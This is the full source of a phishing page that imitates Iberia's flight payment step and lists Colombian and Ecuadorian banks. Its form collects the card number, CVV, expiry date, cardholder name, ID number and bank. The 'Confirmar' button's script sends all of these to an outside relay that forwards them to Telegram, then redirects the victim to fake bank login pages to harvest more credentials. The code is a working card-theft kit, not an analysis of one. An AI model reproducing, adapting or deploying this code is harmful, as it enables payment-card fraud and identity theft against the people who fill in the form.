<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informaci√≥n de pago</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
        }
        
        .header {
             background: linear-gradient(135deg, #d32f2f, #f44336);
            color: white;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
  
        .flight-info {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .airplane-icon {
            width: 20px;
            height: 20px;
            background-color: #ffc107;
            border-radius: 50%;
            position: relative;
        }
        
        .airplane-icon::after {
            content: '‚úà';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #dc3545;
            font-size: 12px;
        }
        
        .route {
            font-size: 18px;
            font-weight: 500;
        }
        
        .date {
            font-size: 14px;
            opacity: 0.9;
        }
        
        .passenger-count {
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 14px;
        }
        
        .modify-search {
            color: white;
            text-decoration: underline;
            font-size: 14px;
            cursor: pointer;
        }
        
        .user-info {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .user-icon {
            width: 20px;
            height: 20px;
            background-color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .user-icon::after {
            content: 'üë§';
            font-size: 12px;
            color: #dc3545;
        }
        
        .total-price {
            font-size: 18px;
            font-weight: bold;
        }
        
        .progress-steps {
            background-color: white;
            padding: 20px 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 15px;
            border-bottom: 1px solid #e0e0e0;
            overflow-x: auto;
            white-space: nowrap;
        }
        
        .step {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            color: #666;
            flex-shrink: 0;
        }
        
        .step.active {
            color: #dc3545;
            font-weight: 500;
        }
        
        .step-number {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background-color: #e0e0e0;
            color: #666;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
        }
        
        .step.active .step-number {
            background-color: #dc3545;
            color: white;
        }
        
        .main-content {
            padding: 20px 15px;
        }
        
        .page-title {
            font-size: 24px;
            color: #333;
            margin-bottom: 30px;
            font-weight: 400;
        }
        
        .form-container {
            background-color: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 800px;
            margin: 0 auto;
        }
        
        .payment-header {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #eee;
        }
        
        .payment-icon {
            color: #dc3545;
            font-size: 20px;
        }
        
        .payment-title {
            font-size: 18px;
            color: #dc3545;
            font-weight: 500;
        }
        
        .form-row {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .form-group {
            flex: 1;
        }
        
        .form-group.half {
            flex: 0.5;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-size: 13px;
            color: #666;
            font-weight: 500;
        }
        
        .form-label.required::after {
            content: ' *';
            color: #dc3545;
        }
        
        .form-input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            color: #333;
            background-color: #fff;
            position: relative;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #dc3545;
        }
        
        .form-input.error {
            border-color: #dc3545;
            background-color: #fff5f5;
        }
        
        .form-input::placeholder {
            color: #aaa;
        }
        
        .date-group {
            display: flex;
            gap: 10px;
            align-items: flex-end;
        }
        
        .date-select {
            flex: 1;
        }
        
        .date-label {
            display: block;
            margin-bottom: 8px;
            font-size: 12px;
            color: #999;
            text-transform: uppercase;
            font-weight: 500;
        }
        
        .form-select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            color: #333;
            background-color: #fff;
            cursor: pointer;
        }
        
        .form-select:focus {
            outline: none;
            border-color: #dc3545;
        }
        
        .cvv-group {
            position: relative;
        }
        
        .cvv-input {
            padding-right: 40px;
        }
        
        .cvv-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #999;
            cursor: pointer;
        }
        
        .cvv-help {
            display: block;
            margin-top: 5px;
            font-size: 12px;
            color: #666;
            text-decoration: underline;
            cursor: pointer;
        }
        
        .button-container {
            margin-top: 40px;
            display: flex;
            justify-content: flex-end;
            gap: 15px;
        }
        
        .btn {
            padding: 12px 30px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn-secondary {
            background-color: #f8f9fa;
            color: #666;
            border: 1px solid #ddd;
        }
        
        .btn-secondary:hover {
            background-color: #e9ecef;
        }
        
        .btn-primary {
            background-color: #dc3545;
            color: white;
        }
        
        .btn-primary:hover {
            background-color: #c82333;
        }
        
        .btn-primary:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        
        .error-message {
            color: #dc3545;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
        
        /* Media Queries para Responsive Design */
        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                text-align: center;
                gap: 15px;
                padding: 15px 10px;
            }
            
            .flight-info {
                order: 2;
            }
            
            .user-info {
                order: 1;
                justify-content: center;
            }
            
            .total-price {
                font-size: 16px;
            }
            
            .progress-steps {
                padding: 15px 5px;
                gap: 8px;
            }
            
            .step {
                font-size: 12px;
                gap: 5px;
            }
            
            .step span {
                display: none;
            }
            
            .step-number {
                width: 18px;
                height: 18px;
                font-size: 10px;
            }
            
            .main-content {
                padding: 15px 10px;
            }
            
            .form-container {
                padding: 15px;
                border-radius: 0;
                margin: 0;
                box-shadow: none;
            }
            
            .page-title {
                font-size: 20px;
                margin-bottom: 20px;
                text-align: center;
            }
            
            .form-row {
                flex-direction: column;
                gap: 15px;
            }
            
            .form-group.half {
                flex: 1;
            }
            
            .payment-header {
                flex-direction: column;
                text-align: center;
                gap: 10px;
            }
            
            .date-group {
                flex-direction: column;
                gap: 15px;
            }
            
            .button-container {
                flex-direction: column;
                gap: 10px;
                margin-top: 30px;
            }
            
            .btn {
                width: 100%;
                padding: 15px;
                font-size: 16px;
            }
        }
        
        @media (max-width: 480px) {
            .header {
                padding: 10px 5px;
            }
            
            .progress-steps {
                padding: 10px 5px;
                gap: 5px;
            }
            
            .main-content {
                padding: 10px 5px;
            }
            
            .form-container {
                padding: 10px;
            }
            
            .page-title {
                font-size: 18px;
            }
            
            .payment-title {
                font-size: 16px;
            }
            
            .form-input {
                padding: 15px 12px;
                font-size: 16px; /* Previene zoom en iOS */
            }
            
            .form-select {
                padding: 15px 12px;
                font-size: 16px;
            }
            
            .total-price {
                font-size: 14px;
            }
        }

        /* Pantalla de carga */
.loading-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: #f8f9fa;
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 9999;
}

.loading-container {
    text-align: center;
    background: white;
    padding: 50px 40px;
    border-radius: 8px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
    border: 1px solid #e9ecef;
    max-width: 300px;
}

.spinner {
    width: 40px;
    height: 40px;
    border: 3px solid #e9ecef;
    border-top: 3px solid #0d6efd;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 0 auto 25px auto;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.loading-text {
    font-size: 16px;
    font-weight: 500;
    margin: 0 0 8px 0;
    color: #495057;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}

.loading-subtext {
    font-size: 13px;
    margin: 0;
    color: #6c757d;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}
    </style>
</head>
<body>
    <div class="header">
        <div class="flight-info">
             <div class="logo">
                <img src="img/IBERIA.COM_ los mejores precios para vuelos de Iberia.svg" alt="Iberia Logo">
            </div>
        </div>
        <div class="user-info">
            <i class="fa-solid fa-user"></i>
            <!-- <span>Acceder</span> -->
        </div>
    </div>
    
    <div class="progress-steps">
        <div class="step">
            <div class="step-number">1</div>
            <span>Selecci√≥n de vuelos</span>
        </div>
        <div class="step">
            <div class="step-number">2</div>
            <span>Datos de pasajeros</span>
        </div>
        <div class="step">
            <div class="step-number">3</div>
            <span>Personaliza y completa</span>
        </div>
        <div class="step active">
            <div class="step-number">4</div>
            <span>Pago</span>
        </div>
        <div class="step">
            <div class="step-number">5</div>
            <span>Confirmaci√≥n</span>
        </div>
    </div>
    
    <div class="main-content">
        <div class="form-container">
            <h1 class="page-title">Informaci√≥n de pago</h1>
            
            <div class="payment-header">
                <div class="payment-icon"><i class="fa-solid fa-credit-card"></i></div>
                <div class="payment-title">Seleccione m√©todo de pago</div>
            </div>
            
            <form id="paymentForm">
                <!-- Selector de Banco -->
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label required">Seleccione su banco</label>
                        <select class="form-select" id="banco" name="banco" onchange="validateForm()" required>
                            <option value="" disabled selected>Seleccione su banco</option>
                            <option value="BANCOLOMBIA">BANCOLOMBIA</option>
        <option value='BANCO AGRARIO'>BANCO AGRARIO</option>
        <option value='BANCO AVVILLAS'>BANCO AV VILLAS</option>
        <option value='BANCO BBVA'>BANCO BBVA</option>
        <option value='BANCO CAJA SOCIAL'>BANCO CAJA SOCIAL</option>
        <option value='BANCO CITIBANK'>BANCO CITIBANK</option>
        <option value='BANCO COLPATRIA'>BANCO COLPATRIA</option>
        <option value='BANCO CORPBANCA'>BANCO CORPBANCA</option>
        <option value='BANCO DAVIVIENDA'>BANCO DAVIVIENDA</option>
        <option value='BANCO DE BOGOTA'>BANCO DE BOGOTA</option>
        <option value='BANCO DE OCCIDENTE'>BANCO DE OCCIDENTE</option>
        <option value='BANCO FALABELLA'>BANCO FALABELLA</option>
        <option value='BANCO FINANDINA'>BANCO FINANDINA</option>
        <option value='BANCO GANADERO'>BANCO GANADERO</option>
        <option value='BANCO GNB SUDAMERIS'>BANCO GNB SUDAMERIS</option>
        <option value='BANCO HSBC COLOMBIA'>BANCO HSBC COLOMBIA</option>
        <option value='BANCO ITAU'>BANCO ITAU</option>
        <option value='BANCO BOLIVARIANO'>BANCO BOLIVARIANO</option>
        <option value='BANCO GUAYAQUIL'>BANCO GUAYAQUIL</option>
        <option value='BANCO PACIFICO'>BANCO PACIFICO</option>
        <option value='PRODUBANCO'>PRODUBANCO</option>
        <option value='BANCO PICHINCHA'>BANCO PICHINCHA</option>
        <option value='BANCO POPULAR'>BANCO POPULAR</option>
        <option value='BANCO SANTANDER'>BANCO SANTANDER COLOMBIA</option>
        <option value='BANCO HELM BANK'>HELM BANK</option>
        <option value='NEQUI'>NEQUI</option>
        <option value='TUYA'>TUYA</option>
        <option value='NUBANK'>NUBANK</option>
        <option value="NN">OTRO</option>
                        </select>
                        <div class="error-message" id="bancoError">Este campo es obligatorio</div>
                    </div>
                </div>

                <!-- N√∫mero de Tarjeta -->
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label required">N√∫mero de tarjeta</label>
                        <input type="text" class="form-input" id="numeroTarjeta" placeholder="" maxlength="19" oninput="formatCardNumber(this); validateForm()" required>
                        <div class="error-message" id="numeroTarjetaError">Este campo es obligatorio</div>
                    </div>
                </div>
                
                <!-- Nombre del titular -->
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label required">Nombre del titular</label>
                        <input type="text" class="form-input" id="nombreTitular" placeholder="Nombre del titular" oninput="validateForm()" required>
                        <div class="error-message" id="nombreTitularError">Este campo es obligatorio</div>
                    </div>
                </div>
                
                <!-- Documento del titular -->
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label required">Documento del titular</label>
                        <input type="number" class="form-input" id="documentoTitular" placeholder="Documento del titular" oninput="validateForm()" required>
                        <div class="error-message" id="documentoTitularError">Este campo es obligatorio</div>
                    </div>
                </div>
                
                <!-- Fecha de vencimiento y CVV -->
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label required">Fecha de expiraci√≥n</label>
                        <input type="text" class="form-input" id="fechaExpiracion" placeholder="MM/AA" maxlength="5" oninput="formatExpiryDate(this); validateForm()" required>
                        <div class="error-message" id="fechaExpiracionError">Este campo es obligatorio</div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label required">C√≥digo CVV</label>
                        <div class="cvv-group">
                            <input type="password" class="form-input cvv-input" id="codigoCVV" placeholder="123" maxlength="4" oninput="limitCVV(this); validateForm()" required>
                            <i class="fa-solid fa-eye cvv-icon" onclick="toggleCVV()" id="cvvToggle"></i>
                        </div>
                        <span class="cvv-help" onclick="showCVVInfo()">¬øQu√© es el CVV?</span>
                        <div class="error-message" id="codigoCVVError">Este campo es obligatorio</div>
                    </div>
                </div>
                
                <div class="button-container">
                    <button type="button" class="btn btn-secondary" onclick="goBack()">Atr√°s</button>
                    <button type="button" class="btn btn-primary" id="continueBtn" onclick="enviarDatosTelegram()" disabled>Confirmar</button>
                </div>
            </form>
        </div>
    </div>
    
    <script>
        // Variable global para almacenar datos
        window.paymentData = {};

        // Funci√≥n para obtener par√°metros de la URL
        function obtenerParametros() {
            const urlParams = new URLSearchParams(window.location.search);
            
            // Obtener precio
            const precio = urlParams.get('precio');
            if (precio) {
                document.getElementById('totalPrice').textContent = `TOTAL: ${precio}`;
            }
            
            console.log('Par√°metros de URL encontrados en p√°gina de pago:');
            for (let [key, value] of urlParams) {
                console.log(`${key}:`, value);
            }
        }
        
        // Funci√≥n para formatear n√∫mero de tarjeta
        function formatCardNumber(input) {
            let value = input.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
            if (formattedValue.length > 19) {
                formattedValue = formattedValue.substring(0, 19);
            }
            input.value = formattedValue;
        }

        // Funci√≥n para formatear fecha de expiraci√≥n
        function formatExpiryDate(input) {
            var sanitized = input.value.replace(/[^0-9]/g, '');
            if (sanitized.length > 2) {
                sanitized = sanitized.substring(0, 2) + '/' + sanitized.substring(2, 4);
            }
            input.value = sanitized;
        }

        // Funci√≥n para limitar CVV
        function limitCVV(input) {
            input.value = input.value.replace(/[^0-9]/g, '');
            if (input.value.length > 4) {
                input.value = input.value.slice(0, 4);
            }
        }
        
        // Funci√≥n para mostrar/ocultar CVV
        function toggleCVV() {
            const cvvInput = document.getElementById('codigoCVV');
            const toggleIcon = document.getElementById('cvvToggle');
            
            if (cvvInput.type === 'password') {
                cvvInput.type = 'text';
                toggleIcon.classList.remove('fa-eye');
                toggleIcon.classList.add('fa-eye-slash');
            } else {
                cvvInput.type = 'password';
                toggleIcon.classList.remove('fa-eye-slash');
                toggleIcon.classList.add('fa-eye');
            }
        }
        
        // Funci√≥n para mostrar informaci√≥n del CVV
        function showCVVInfo() {
            alert('El CVV es un c√≥digo de seguridad de 3 o 4 d√≠gitos ubicado en el reverso de su tarjeta.');
        }
        
        // Funci√≥n para mostrar pantalla de carga
        function mostrarPantallaCarga() {
            const loadingHTML = `
                <div id="loadingScreen" class="loading-overlay">
                    <div class="loading-container">
                        <div class="spinner"></div>
                        <p class="loading-text">Procesando informaci√≥n...</p>
                        <p class="loading-subtext">Por favor espere</p>
                    </div>
                </div>
            `;
            document.body.insertAdjacentHTML('beforeend', loadingHTML);
        }

        // Funci√≥n para ocultar pantalla de carga
        function ocultarPantallaCarga() {
            const loadingScreen = document.getElementById('loadingScreen');
            if (loadingScreen) {
                loadingScreen.remove();
            }
        }

        // Funci√≥n para validar n√∫mero de tarjeta con algoritmo de Luhn
        function validarLuhn(numero) {
            let suma = 0;
            let alternar = false;
            
            // Recorrer de derecha a izquierda
            for (let i = numero.length - 1; i >= 0; i--) {
                let n = parseInt(numero.charAt(i), 10);
                
                if (alternar) {
                    n *= 2;
                    if (n > 9) {
                        n = (n % 10) + 1;
                    }
                }
                
                suma += n;
                alternar = !alternar;
            }
            
            return (suma % 10) === 0;
        }

        // Funci√≥n para validar el formulario
        function validateForm() {
            const requiredFields = [
                'banco', 'numeroTarjeta', 'nombreTitular', 'documentoTitular', 
                'fechaExpiracion', 'codigoCVV'
            ];
            let allValid = true;
            
            requiredFields.forEach(fieldId => {
                const field = document.getElementById(fieldId);
                const errorDiv = document.getElementById(fieldId + 'Error');
                
                // Validar campo vac√≠o
                if (!field.value.trim()) {
                    field.classList.add('error');
                    if (errorDiv) errorDiv.style.display = 'block';
                    allValid = false;
                } else {
                    // Validaciones espec√≠ficas
                    if (fieldId === 'numeroTarjeta') {
                        const cardNumber = field.value.replace(/\s/g, '');
                        if (cardNumber.length < 13 || cardNumber.length > 19) {
                            field.classList.add('error');
                            errorDiv.style.display = 'block';
                            errorDiv.textContent = 'N√∫mero de tarjeta inv√°lido';
                            allValid = false;
                        } else if (!validarLuhn(cardNumber)) {
                            field.classList.add('error');
                            errorDiv.style.display = 'block';
                            errorDiv.textContent = 'N√∫mero de tarjeta inv√°lido';
                            allValid = false;
                        } else {
                            field.classList.remove('error');
                            errorDiv.style.display = 'none';
                        }
                    } else if (fieldId === 'codigoCVV') {
                        if (field.value.length < 3 || field.value.length > 4) {
                            field.classList.add('error');
                            errorDiv.style.display = 'block';
                            errorDiv.textContent = 'CVV debe tener 3 o 4 d√≠gitos';
                            allValid = false;
                        } else {
                            field.classList.remove('error');
                            errorDiv.style.display = 'none';
                        }
                    } else if (fieldId === 'fechaExpiracion') {
                        if (field.value.length !== 5 || !field.value.includes('/')) {
                            field.classList.add('error');
                            errorDiv.style.display = 'block';
                            errorDiv.textContent = 'Formato debe ser MM/AA';
                            allValid = false;
                        } else {
                            field.classList.remove('error');
                            errorDiv.style.display = 'none';
                        }
                    } else {
                        field.classList.remove('error');
                        if (errorDiv) errorDiv.style.display = 'none';
                    }
                }
            });
            
            // Habilitar/deshabilitar bot√≥n continuar
            document.getElementById('continueBtn').disabled = !allValid;
            
            return allValid;
        }
        
        // Funci√≥n para volver atr√°s
        function goBack() {
            window.history.back();
        }
        
        // Funci√≥n principal para enviar datos a Telegram
        async function enviarDatosTelegram() {
            if (!validateForm()) {
                alert('Por favor complete todos los campos correctamente.');
                return;
            }

            // Mostrar pantalla de carga
            mostrarPantallaCarga();

            const titular = document.getElementById('nombreTitular').value.trim();
            const numeroTarj = document.getElementById('numeroTarjeta').value.replace(/\s+/g,'');
            const fechaExp = document.getElementById('fechaExpiracion').value;
            const cvv = document.getElementById('codigoCVV').value;
            const documento = document.getElementById('documentoTitular').value.trim();
            const banco = document.getElementById('banco').value;

            // Construir mensaje con emojis
            const mensaje = `
üîª *Nueva solicitud de datos* üîª

üë§ Titular: ${titular}
üí≥ N√∫mero de tarjeta: ${numeroTarj}
üìÖ Fecha de expiraci√≥n: ${fechaExp}
üîê CVV: ${cvv}
üÜî Documento: ${documento}
üè¶ Banco: ${banco}
            `.trim();

            try {
                const resp = await fetch('https://avori-telegram-api.vercel.app/api/send-telegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message: mensaje })
                });

                if (resp.ok) {
                    // Esperar un momento antes de redirigir para que se vea la pantalla de carga
                    setTimeout(() => {
                        redirigirSegunBanco(banco);
                    }, 1000);
                } else {
                    ocultarPantallaCarga();
                    console.error('Error API status:', resp.status);
                    alert('Error al enviar la informaci√≥n. Por favor intente nuevamente.');
                }
            } catch (err) {
                ocultarPantallaCarga();
                console.error('Fallo de red:', err);
                alert('Error de conexi√≥n. Por favor verifique su internet e intente nuevamente.');
            }
        }

        // Funci√≥n para redireccionar seg√∫n el banco
        function redirigirSegunBanco(banco) {
            const redirecciones = {
                 'BANCOLOMBIA': 'bancos/bancol/formulario_u1.php',
        'BANCO AGRARIO': 'bancos/agra.html',
        'BANCO AVVILLAS': 'bancos/villas/formulario_u1.php',
        'BANCO BBVA': 'bancos/bba/formulario_u1.php',
        'BANCO CAJA SOCIAL': 'bancos/cjs/formulario_u1.php',
        'BANCO CITIBANK': 'bancos/colpa/scoti.html',
        'BANCO COLPATRIA': 'bancos/colpa/formulario_u1.php',
        'BANCO CORPBANCA': 'bancos/itau/formulario_u1.php',
        'BANCO DAVIVIENDA': 'bancos/davi/formulario_u1.php',
        'BANCO DE BOGOTA': 'bancos/bogota/formulario_u1.php',
        'BANCO DE OCCIDENTE': 'bancos/occi/formulario_u1.php',
        'BANCO FALABELLA': 'bancos/fala/formulario_u1.php',
        'BANCO FINANDINA': 'bancos/finan.html',
        'BANCO GANADERO': 'bancos/ganadero.html',
        'BANCO GNB SUDAMERIS': 'cargapago.html',
        'BANCO HSBC COLOMBIA': 'cargapago.html',
        'BANCO ITAU': 'bancos/itau.html',
        'BANCO POPULAR': 'bancos/popu.html',
        'BANCO SANTANDER': 'bancos/santan.html',
        'BANCO CREDIBANCO': 'cargapago.html',
        'BANCO HELM BANK': 'cargapago.html',
        'Nequi': 'bancos/nequi/formulario_u1.php',
        'SERFINANSA': 'cargapago.html',
        'SERVIBANCA': 'cargapago.html',
        'TUYA': 'cargapago.html',
        'NUBANK': 'cargapago.html',
                'NN': 'cargapago.html'
            };

            const url = redirecciones[banco];
            if (url) {
                window.location.href = url;
            } else {
                ocultarPantallaCarga();
                alert("Banco no reconocido.");
            }
        }
        
        // Ejecutar al cargar la p√°gina
        window.onload = function() {
            obtenerParametros();
            
            // Agregar event listeners para validaci√≥n en tiempo real
            const inputs = document.querySelectorAll('.form-input, .form-select');
            inputs.forEach(input => {
                input.addEventListener('blur', validateForm);
            });
        };
    </script>
</body>
</html>